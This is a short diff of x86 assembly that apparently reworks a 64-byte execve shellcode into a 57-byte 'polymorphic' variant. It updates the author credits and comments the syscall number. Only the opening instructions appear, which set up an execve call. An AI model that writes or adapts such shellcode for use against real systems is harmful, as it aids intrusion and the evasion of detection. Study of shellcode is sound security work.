@@ -1,12 +1,15 @@
-; Author: @bugsam
+; Author: Anonymous (chaossecurity wordpress)
+; Polymorphic version: @bugsam
 ; Date: 07/30/2020
+; Original: 64 bytes
+; Version: 57 bytes
 
 global _start
 
 section .text
 _start:
 	push 0xb
-	pop eax
+	pop eax			; (EAX) SYS_execve
 	cdq
 
 	push dx
